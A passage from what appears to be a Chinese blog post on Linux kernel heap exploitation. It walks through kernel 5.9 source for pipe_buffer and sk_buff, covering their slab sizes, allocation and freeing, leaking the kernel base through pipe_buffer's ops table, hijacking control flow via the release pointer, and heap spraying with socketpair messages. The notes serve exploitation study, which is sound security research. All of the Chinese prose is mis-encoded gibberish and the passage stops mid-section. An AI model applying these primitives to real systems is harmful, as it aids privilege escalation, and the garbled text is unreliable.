(kill)\n\t\tfree_pipe_info(pipe);\n}\n```\n\nåªæœ‰`pipe_inode_info`è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„`files`æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚\n\nç›¸å…³é‡Šæ”¾å‡½æ•°`free_pipe_info`\n\n```c\n//v5.9 /fs/pipe.c\nvoid free_pipe_info(struct pipe_inode_info *pipe)\n{\n\tint i;\n    //....\n    //å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹\n\tfor (i = 0; i < pipe->ring_size; i++) {\n\t\tstruct pipe_buffer *buf = pipe->bufs + i;\n\t\tif (buf->ops)\n\t\t\tpipe_buf_release(pipe, buf);\n\t}\n    //......\n    //é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024\n\tkfree(pipe->bufs);\n    //é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192\n\tkfree(pipe);\n}\n```\n\n\n\n### (3)åˆ©ç”¨\n\n#### â‘ ä¿¡æ¯æ³„éœ²\n\n`pipe_buffer`ç»“æ„çš„`buf`\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\nå…¶ä¸­çš„`ops`æˆå‘˜ï¼Œå³`struct pipe_buf_operations`ç»“æ„çš„`pipe->bufs[i]->ops`ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º\n\n```C\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buf_operations {\n\tint (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tvoid (*release)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*get)(struct pipe_inode_info *, struct pipe_buffer *);\n};\n```\n\n#### â‘¡åŠ«æŒç¨‹åºæµ\n\nå½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°`free_pipe_info`å‡½æ•°ï¼Œåœ¨æ¸…ç†`pipe_buffer`æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š\n\n```c\nif (buf->ops)\n    pipe_buf_release(pipe, buf);\n```\n\nå½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨`write`å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®\n\n```c\n//v5.9 /fs/pipe.c\nstatic ssize_t\n    pipe_write(struct kiocb *iocb, struct iov_iter *from)\n{\n    //......\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //......\n    buf = &pipe->bufs[head & mask];\n    buf->page = page;\n    buf->ops = &anon_pipe_buf_ops;\n    buf->offset = 0;\n    buf->len = 0;\n    //......\n\n}\n```\n\nç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨`read`å¯¹åº”çš„`pipe_read`å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ\n\n```c\n//v5.9  /fs/pipe.c\nstatic ssize_t\n    pipe_read(struct kiocb *iocb, struct iov_iter *to)\n{\n    //....\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //....\n    if (!buf->len) {\n        pipe_buf_release(pipe, buf);\n        //....\n    }\n    //....\n}\n```\n\nä»è€Œè°ƒç”¨`pipe_buf_release`å°†`buf->ops`æ¸…ç©ºã€‚\n\nğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†`pipe_buf_release`å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡`read`å°†ç®¡é“`pipe`ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥`release`å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰\n\né‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨\n\n![image-20220509192251738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png)\n\nè€Œå½“`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„`pipe_buf_release`å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª`buf->ops`å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„`relase`å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„`pipe_buf_operations`ç»“æ„ä¸­æœ‰æåˆ°\n\n![image-20220509193945468](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png)\n\né‚£ä¹ˆå¦‚æœåŠ«æŒäº†`buf->ops`è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°`release`å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚\n\nä¸è¿‡`pipe`ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬`bsauce`è¯´æ˜¯åœ¨`struct pipe_buffer`ç»“æ„ä¸‹`buf`çš„`page`é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„`kmalloc`å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„`sk_buff`æœ‰ç‚¹ä¸åŒã€‚\n\n## 8.sk_buff---kmalloc-512åŠä»¥ä¸Š\n\nå‚è€ƒï¼š[(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair](https://blog.csdn.net/weixin_40039738/article/details/81095013)\n\nå’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª`socketpair`ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯`socket`ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ`pipe`éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š\n\n- æ•°æ®ä¼ è¾“æ¨¡å¼\n  - `pipe`ï¼šå•å·¥ï¼Œå‘é€ç«¯`fd[1]`å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯`fd[0]`æ¥æ”¶æ•°æ®\n  - `socketpair`ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚\n- æ¨¡å¼\n  - `pipe`ï¼šç”±`flag`æ¥å®šä¹‰ä¸åŒæ¨¡å¼\n  - `socketpair`ï¼šé»˜è®¤é˜»å¡çŠ¶æ€\n\næ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ`pipe()`å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹`socketpair`çš„è°ƒç”¨ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n```c\n#include <sys/socket.h>\n\n//é»˜è®¤å¿…é¡»\nint socket_fd[2];\n//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„\nint sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, 0, socket_fd);\nif( sockPair_return < 0){\n    perror( \"socketpair()\" );\n    exit(1);\n}\n```\n\nç„¶åå’Œ`pipe`ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨`write/read`å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(socket_fd[0],msg,0x8);\nread(socket_fd[1],buf,0x8);\n```\n\n#### â‘¡é‡Šæ”¾\n\n```c\nclose(socket_fd[0]);\nclose(socket_fd[1]);\n```\n\nå¯ä»¥çœ‹åˆ°å’Œ`pipe`æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\nåœ¨è°ƒç”¨`socketpair`è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨`write`æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚\n\n#### â‘ åˆ†é…\n\nåœ¨è°ƒç”¨`write`è¿›è¡Œæ•°æ®å†™å…¥æ—¶\n\nå‡½æ•°é“¾ï¼š\n\n```c\nwrite -> ksys_write() -> vfs_write() -> new_sync_write() -> call_write_iter() -> sock_write_iter() -> sock_sendmsg() -> sock_sendmsg_nosec() -> unix_stream_sendmsg()->å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶\n```\n\nåœ¨`unix_stream_sendmsg`å¼€å§‹åˆ†å‰\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg,\n\t\t\t       size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct sock *other = NULL;\n\tint err, size;\n\tstruct sk_buff *skb;\n\tint sent = 0;\n\tstruct scm_cookie scm;\n\tbool fds_sent = false;\n\tint data_len;\n\t//.....\n\twhile (sent < len) {\n\t\tsize = len - sent;\n\t\t/* Keep two messages in the pipe so it schedules better */\n\t\tsize = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);\n\t\t/* allow fallback to order-0 allocations */\n\t\tsize = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);\n\t\tdata_len = max_t(int, 0, size - SKB_MAX_HEAD(0));\n\t\tdata_len = min_t(size_t, size, PAGE_ALIGN(data_len));\n        //------------------åˆ†å‰ä¸€:å†…å­˜ç”³è¯·éƒ¨åˆ†\n\t\tskb = sock_alloc_send_pskb(sk, size - data_len, data_len,\n\t\t\t\t\t   msg->msg_flags & MSG_DONTWAIT, &err,\n\t\t\t\t\t   get_order(UNIX_SKB_FRAGS_SZ));\n        //ç›¸å…³æ£€æŸ¥éƒ¨åˆ†\n\t\tif (!skb)\n\t\t\tgoto out_err;\n\t\t/* Only send the fds in the first buffer */\n\t\terr = unix_scm_to_skb(&scm, skb, !fds_sent);\n\t\tif (err < 0) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n\t\t//.....\n        //----------------------åˆ†å‰äºŒ:æ•°æ®å¤åˆ¶éƒ¨åˆ†\n\t\tskb_put(skb, size - data_len);\n\t\tskb->data_len = data_len;\n\t\tskb->len = size;\n        //è¿™é‡Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶\n\t\terr = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, size);\n\t\tif (err) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n        //.....\n\t\tsent += size;\n\t}\n\t//......\n\n\treturn sent;\nout_err:\n\tscm_destroy(&scm);\n\treturn sent ? : err;\n}\n```\n\n##### A.å†…å­˜ç”³è¯·\n\nå…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³`sock_alloc_send_pskb() -> alloc_skb_with_frags() -> alloc_skb() -> __alloc_skb()`\n\nè¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„`__alloc_skb`å‡½æ•°ï¼Œ\n\n```c\n//v5.9 /net/core/skbuff.c\nstruct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,\n\t\t\t    int flags, int node)\n{\n\tstruct kmem_cache *cache;\n\tstruct skb_shared_info *shinfo;\n\tstruct sk_buff *skb;\n\tu8 *data;\n\tbool pfmemalloc;\n\n\tcache = (flags & SKB_ALLOC_FCLONE)\n\t\t? skbuff_fclone_cache : skbuff_head_cache;\n\n\tif (sk_memalloc_socks() && (flags & SKB_ALLOC_RX))\n\t\tgfp_mask |= __GFP_MEMALLOC;\n\n\t/* Get the HEAD */\n    //ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜\n    //ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„\n\tskb = kmem_cache_alloc_node(cache, gfp_mask & ~__GFP_DMA, node);\n\tif (!skb)\n\t\tgoto out;\n\t//......\n    //å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½\n\tsize = SKB_DATA_ALIGN(size);\n    //size += å¯¹é½ä¹‹åçš„0x140\n    //é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512\n\tsize += SKB_DATA_ALIGN(sizeof(struct skb_shared_info));\n    \n    //è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼\n    //è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…\n    //è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—\n    //å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°\n    //åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶\n\tdata = kmalloc_reserve(size, gfp_mask, node, &pfmemalloc);\n\tif (!data)\n\t\tgoto nodata;\n\t//...\n\tsize = SKB_WITH_OVERHEAD(ksize(data));\n\t//....\n    //åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„\n\tmemset(skb, 0, offsetof(struct sk_buff, tail));\n\t/* Account for allocated memory : skb + skb->head */\n\tskb->truesize = SKB_TRUESIZE(size);\n\tskb->pfmemalloc = pfmemalloc;\n\trefcount_set(&skb->users, 1);\n\tskb->head = data;\n\tskb->data = data;\n\tskb_reset_tail_pointer(skb);\n\tskb->end = skb->tail + size;\n\tskb->mac_header = (typeof(skb->mac_header))~0U;\n\tskb->transport_header = (typeof(skb->transport_header))~0U;\n\t//...\nout:\n\treturn skb;\nnodata:\n\tkmem_cache_free(cache, skb);\n\tskb = NULL;\n\tgoto out;\n}\n```\n\n###### å†…å­˜ç”³è¯·æ€»ç»“ï¼š\n\n- `sk_buff`ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± `skbuff_fclone_cache/skbuff_head_cache`ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶\n- `skb->data`ä¸ºå®é™…çš„æ•°æ®ç»“æ„\n  - `size`ï¼š`0x140+n*0x40`(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚\n  - å †å—ç”³è¯·ï¼šèµ°`kmalloc`è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚\n- æ¯è°ƒç”¨`wirte`å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„`sk_buff`å’Œ`skb->data`ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚\n\n##### B.æ•°æ®å¤åˆ¶\n\nç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°`unix_stream_sendmsg`å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶`skb_copy_datagram_from_iter`ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚\n\n```c\n//v5.9 /net/core/datagram.c\nint skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,\n                                struct iov_iter *from,\n                                int len)\n{\n    int start = skb_headlen(skb);\t\t\t// skb->len - skb->data_len;\n    int i, copy = start - offset;\t\t\t// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°\n    struct sk_buff *frag_iter;\n    //æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb->data\n    if (copy > 0) {\n        if (copy > len)\n            copy = len;\n        if (copy_from_iter(skb->data + offset, copy, from) != copy)\n            goto fault;\n        if ((len -= copy) == 0)\n            return 0;\n        offset += copy;\n    }\n    //....\n}\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nå½“ä»`socker`å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”`sk_buff`å’Œ`skb->data`çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚\n\nåœ¨`read`æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š\n\n```\nread -> ksys_read() -> vfs_read() -> new_sync_read() -> call_read_iter() -> sock_read_iter() -> sock_recvmsg() -> sock_recvmsg_nosec() -> unix_stream_recvmsg() -> unix_stream_read_generic()\n```\n\nåŒæ ·çš„åœ¨`unix_stream_read_generic`å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_read_generic(struct unix_stream_read_state *state,\n\t\t\t\t    bool freezable)\n{\n    //....\n\tdo {\n        //....\n\t\tchunk = min_t(unsigned int, unix_skb_len(skb) - skip, size);\n\t\tskb_get(skb);\n        //------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶\n        //recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨\n        //è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶\n\t\tchunk = state->recv_actor(skb, skip, chunk, state);\n        //...\n        //ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb->usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­\n        //æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®\n\t\tconsume_skb(skb);\n\t\tif (chunk < 0) {\n\t\t\tif (copied == 0)\n\t\t\t\tcopied = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tcopied += chunk;\n\t\tsize -= chunk;\n\n\t\t/* Mark read part of skb as used */\n\t\tif (!(flags & MSG_PEEK)) {\n            //ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb->cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®\n            //#define UNIXCB(skb)\t(*(struct unix_skb_parms *)&((skb)->cb))\n\t\t\tUNIXCB(skb).consumed += chunk;\n\t\t\t//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®\n            //æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ\n\t\t\tif (unix_skb_len(skb))\n\t\t\t\tbreak;\n            //------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾\n            //å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ\n\t\t\tskb_unlink(skb, &sk->sk_receive_queue);\n            //è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb->usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ\n\t\t\tconsume_skb(skb);\n            //....................\n\t} while (size);\n        //......................\nout:\n\treturn copied ? : err;\n}\n```\n\n##### A.æ•°æ®å¤åˆ¶\n\nä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º\n\n```\nunix_stream_read_actor() -> skb_copy_datagram_msg() -> skb_copy_datagram_iter() -> __skb_datagram_iter()\n```\n\næœ€ç»ˆè¿›å…¥`__skb_datagram_iter`ï¼Œ\n\n```c\n//v5.9 /net/core/datagram.c\nstatic int __skb_datagram_iter(const struct sk_buff *skb, int offset,\n\t\t\t       struct iov_iter *to, int len, bool fault_short,\n\t\t\t       size_t (*cb)(const void *, size_t, void *,\n\t\t\t\t\t    struct iov_iter *), void *data)\n{\n\tint start = skb_headlen(skb);\n\tint i, copy = start - offset, start_off = offset, n;\n\tstruct sk_buff *frag_iter;\n\n\t/* Copy header. */\n    //è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®\n\tif (copy > 0) {\n\t\tif (copy > len)\n\t\t\tcopy = len;\n\t\tn = INDIRECT_CALL_1(cb, simple_copy_to_iter,\n\t\t\t\t    skb->data + offset, copy, data, to);\n\t\toffset += n;\n\t\tif (n != copy)\n\t\t\tgoto short_copy;\n\t\tif ((len -= copy) == 0)\n\t\t\treturn 0;\n\t}\n    //......\n    /* Copy paged appendix. Hmm... why does this look so complicated? */\n    //linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs\n    //......\n}\n```\n\nè¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚\n\n##### B.å†…å­˜é‡Šæ”¾\n\nè¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º\n\n- é‡Šæ”¾`skb->data`éƒ¨åˆ†ï¼š\n\n  ```\n  consume_skb()->__kfree_skb()->skb_release_all()->skb_release_all()->skb_release_data()->skb_free_head()\n  ```\n\n  å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void skb_free_head(struct sk_buff *skb)\n  {\n      //å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„\n  \tunsigned char *head = skb->head;\n  \tif (skb->head_frag) {\n  \t\tif (skb_pp_recycle(skb, head))\n  \t\t\treturn;\n  \t\tskb_free_frag(head);\n  \t} else {\n  \t\tkfree(head);\n  \t}\n  }\n  ```\n\n  å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„`kfree`å‡½æ•°\n\n- é‡Šæ”¾`skb`éƒ¨åˆ†ï¼š\n\n  ```\n  consume_skb()->__kfree_skb()->kfree_skbmem()\n  ```\n\n  ç›¸å…³å‡½æ•°å¦‚ä¸‹\n\n  ```c\n  //v5.9 /net/core/skbuff.c\n  static void kfree_skbmem(struct sk_buff *skb)\n  {\n      struct sk_buff_fclones *fclones;\n      //å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„\n      switch (skb->fclone) {\n          case SKB_FCLONE_UNAVAILABLE:\n              //ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶\n              kmem_cache_free(skbuff_head_cache, skb);\n              return;\n  \n          case SKB_FCLONE_ORIG:\n              fclones = container_of(skb, struct sk_buff_fclones, skb1);\n  \n              /* We usually free the clone (TX completion) before original skb\n  \t\t * This test would have no chance to be true for the clone,\n  \t\t * while here, branch prediction will be good.\n  \t\t */\n              if (refcount_read(&fclones->fclone_ref) == 1)\n                  goto fastpath;\n              break;\n  \n          default: /* SKB_FCLONE_CLONE */\n              fclones = container_of(skb, struct sk_buff_fclones, skb2);\n              break;\n      }\n      if (!refcount_dec_and_test(&fclones->fclone_ref))\n          return;\n  fastpath:\n      //ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb\n      kmem_cache_free(skbuff_fclone_cache, fclones);\n  }\n  \n  ```\n\n  è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚\n\n  åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„`sk_buff`å’Œ`skb->data`éƒ½ä¼šå¾—åˆ°é‡Šæ”¾\n\n##### å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š\n\n- 